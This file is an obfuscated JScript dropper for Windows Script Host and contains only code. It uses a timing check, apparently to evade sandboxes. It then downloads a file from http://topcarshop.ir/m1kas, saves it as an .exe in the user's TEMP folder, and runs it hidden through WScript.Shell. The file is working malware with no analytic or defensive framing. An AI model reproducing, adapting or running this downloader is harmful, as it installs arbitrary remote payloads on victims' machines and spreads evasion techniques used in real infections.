var _CN0 = false;
var _J = "CreateObject";
var _OO0 = function _DC() {return WScript[_J]("WScript"+".Shell");}(), _QZ = 11;
var _U = "MSXML2.XMLHTTP";
var _MM = 2123213;
var _A = 0;
function _OO(_ZR){_OO0["Run"](_ZR, _A, _A);};
function _SQ(){return _U + "";};
function _O(_KT, _RA0){_A = _A * 1; return _KT - _RA0;};
function _E(){return _J;};
/*@cc_on
  @if (@_win32 || @_win64)
    _CN0 = true;
  @end
@*/
if (_CN0)
{
var _HS = "";
function _HT(){return 22;};
var _ZP0 = 0; var _J0 = 0;
function _F()
{
var _F2 = new this["Date"]();
var _YW = _F2["getUTCMilliseconds"]();
WScript["Sleep"](_HT());
var _F2 = new this["Date"]();
var _PT = _F2["getUTCMilliseconds"]();
WScript["Sleep"](_HT());
var _F2 = new this["Date"]();
var _F1 = _F2["getUTCMilliseconds"]();
var _ZP0 = "_F0";
_ZP0 = _O(_PT, _YW);
var _J0 = "_OT";
_J0 = _O(_F1, _PT);
_HS = "open";
return _O(_ZP0, _J0);
}
var _LB = false;
var _ZY = false;
for (var _ZP = _A; _ZP < _HT() * 1; _ZP++){if (_F() != _A){
_LB = true; 
_J0 = "31" + 11 * _ZP0 + _J0; 
_ZY = true; 
break;
}}
function _Y() {return ((_LB == true) && (_LB == _ZY)) ? 1 : _A;};
if (_LB && _Y() && _ZY){
function _CN() {return _OO0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "VJ5hoVv4n.ex" + "e";};
 _U0 = _SQ();
 _YQ = WScript[_J](_U0);
 var _X = 1;
 while (_X){
try {
	if (_X == 1)
	{
		_YQ[_HS]("GET", "http://topcarshop.ir/m1kas", false);
		_YQ["send"]();
		_JJ = "Sleep";
	}
	WScript[_JJ](_HT() + 120); 
	if (_YQ["readystate"] < 2 * 2) continue;
	_X = _A;
	function _RA(_G) {var _M0 = (1, 2, 3, 4, 5, _G); return _M0;};
	_H0 = WScript[_E()]("ADODB.Stream");
	_U0 = _H0;
	_U0[_HS]();
	_U0["type"] = _RA(1);
	_U0["write"](_YQ["ResponseBody"]);
	_H0["position"] = _RA(_A);
	_U0["Save" + "ToFile"](_CN(), 2);
	_H0["cl"+"ose"]();
	_M = _CN();
	_OO(_M);
} catch(_H){};
}
}
}

